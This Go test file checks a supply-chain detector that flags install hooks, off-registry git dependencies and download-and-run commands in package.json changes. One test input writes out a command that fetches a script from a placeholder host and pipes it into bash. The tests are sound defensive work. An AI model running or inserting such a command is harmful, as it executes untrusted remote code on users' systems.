package supply_test

import (
	"context"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/antifailure/antifailure/engine/internal/change"
	"github.com/antifailure/antifailure/engine/internal/report"
	"github.com/antifailure/antifailure/engine/internal/security"
	"github.com/antifailure/antifailure/engine/internal/supply"
)

// probe runs the family against one dependency file's added lines, with a
// policy that makes every key reportable, the way the router would.
func probe(t *testing.T, path string, added ...string) []report.Finding {
	t.Helper()
	in := security.Input{
		Policy: report.Policy{Security: map[report.PolicyKey]report.Level{
			supply.KeyInstallScript:  report.LevelWarn,
			supply.KeyBinaryDownload: report.LevelWarn,
			supply.KeyRegistrySource: report.LevelWarn,
		}},
	}.WithRunArtifacts(security.RunArtifacts{
		DependencyFiles: []security.DependencyFile{{Path: path, Status: "modified", Added: added}},
	})
	fs, err := supply.New().Probe(context.Background(), in)
	require.NoError(t, err)
	return fs
}

func rules(fs []report.Finding) map[string]bool {
	out := map[string]bool{}
	for _, f := range fs {
		out[f.Rule] = true
	}
	return out
}

func TestProbe_InstallHookAdded(t *testing.T) {
	t.Parallel()
	fs := probe(t, "package.json", `    "postinstall": "node scripts/setup.js",`)
	require.True(t, rules(fs)[string(supply.KeyInstallScript)])
	require.Equal(t, "package.json", fs[0].Where)
}

func TestProbe_InstallHookInALockfileIsNotAHook(t *testing.T) {
	t.Parallel()
	// A lockfile cannot declare a lifecycle script, so the same text there is
	// not an install hook. It is also not a description mentioning the word.
	require.False(t, rules(probe(t, "package-lock.json", `      "postinstall_note": "none",`))[string(supply.KeyInstallScript)])
	require.False(t, rules(probe(t, "package.json", `    "description": "runs postinstall steps",`))[string(supply.KeyInstallScript)])
}

func TestProbe_BinaryDownloadPipedToShell(t *testing.T) {
	t.Parallel()
	// A non-hook script so only the download rule fires, isolating it.
	fs := probe(t, "package.json", `    "build": "curl https://example.test/i.sh | bash",`)
	require.True(t, rules(fs)[string(supply.KeyBinaryDownload)])
	require.False(t, rules(fs)[string(supply.KeyInstallScript)])
}

func TestProbe_ADownloadWithoutRunningItIsNotFlagged(t *testing.T) {
	t.Parallel()
	// A URL in a description, and a curl that does not pipe into a shell, are
	// not the download-and-run shape.
	require.Empty(t, probe(t, "package.json", `    "homepage": "https://example.test/download",`))
	require.False(t, rules(probe(t, "package.json", `    "docs": "see curl https://example.test",`))[string(supply.KeyBinaryDownload)])
}

func TestProbe_OffRegistrySource(t *testing.T) {
	t.Parallel()
	fs := probe(t, "package.json", `    "leftpad": "git+https://github.com/x/leftpad.git",`)
	require.True(t, rules(fs)[string(supply.KeyRegistrySource)])
}

func TestProbe_ARegistryVersionIsFine(t *testing.T) {
	t.Parallel()
	require.Empty(t, probe(t, "package.json", `    "leftpad": "^1.0.0",`))
}

// The repository field is metadata whose value is a git URL by design, not a
// dependency resolved to a fork. Flagging it is the false positive this rule
// must not have.
func TestProbe_RepositoryMetadataIsNotADependencySource(t *testing.T) {
	t.Parallel()
	require.False(t, rules(probe(t, "package.json",
		`    "repository": "git+https://github.com/me/mine.git",`))[string(supply.KeyRegistrySource)])
	// And a scheme mentioned in prose is not a source either.
	require.False(t, rules(probe(t, "package.json",
		`    "description": "install from github: our org",`))[string(supply.KeyRegistrySource)])
}

func TestProbe_NotMeasuredIsNoFinding(t *testing.T) {
	t.Parallel()
	// No dependency diff attached: the family reads that as "not measured" and
	// reports nothing rather than a pass it did not earn.
	in := security.Input{Policy: report.Policy{Security: map[report.PolicyKey]report.Level{
		supply.KeyInstallScript: report.LevelWarn,
	}}}
	fs, err := supply.New().Probe(context.Background(), in)
	require.NoError(t, err)
	require.Empty(t, fs)
}

func TestProbe_OneFindingPerKeyPerFile(t *testing.T) {
	t.Parallel()
	// Two install hooks in one file is one install-hook finding for that file.
	fs := probe(t, "package.json",
		`    "preinstall": "node a.js",`,
		`    "postinstall": "node b.js",`)
	count := 0
	for _, f := range fs {
		if f.Rule == string(supply.KeyInstallScript) {
			count++
		}
	}
	require.Equal(t, 1, count)
}

func TestProbe_IgnoreLevelDropsTheFinding(t *testing.T) {
	t.Parallel()
	in := security.Input{Policy: report.Policy{Security: map[report.PolicyKey]report.Level{
		supply.KeyInstallScript: report.LevelIgnore,
	}}}.WithRunArtifacts(security.RunArtifacts{
		DependencyFiles: []security.DependencyFile{{Path: "package.json", Added: []string{`"postinstall": "x",`}}},
	})
	fs, err := supply.New().Probe(context.Background(), in)
	require.NoError(t, err)
	require.Empty(t, fs)
}

func TestFamily_RegistersOnTheSpine(t *testing.T) {
	t.Parallel()
	f := supply.New()
	require.Equal(t, "supply_chain", f.Name())
	require.Equal(t, []change.Surface{change.SurfaceDependency}, f.Surfaces())
	require.Equal(t, []change.Check{change.CheckSupplyChain}, f.Checks())
	require.Empty(t, f.Licensed())

	reg := security.NewRegistry()
	require.NotPanics(t, func() { reg.Register(f) })
	require.Equal(t, []security.Family{f}, reg.ForSurface(change.SurfaceDependency))
}

// Every supply_chain key is a deny-it key: it refuses a dependency change on
// policy grounds rather than proving a runtime exploit, so the spine's ExitFor
// gives it the policy-denial exit, and the family declares the same.
func TestFamily_KeysAreDenyItAndDefaultWarn(t *testing.T) {
	t.Parallel()
	keys := supply.New().Keys()
	require.Len(t, keys, 3)
	for _, k := range keys {
		require.Equal(t, "supply_chain", security.FamilyOf(string(k.Key)))
		require.NotEmpty(t, k.Title)
		require.Equal(t, security.ExitFor(k.Key), k.Exit)
		require.Equal(t, report.ExitPolicyDenial, k.Exit, "%s should refuse on policy grounds", k.Key)
		require.Equal(t, report.LevelWarn, k.Default, "%s should default to warn", k.Key)
	}
}
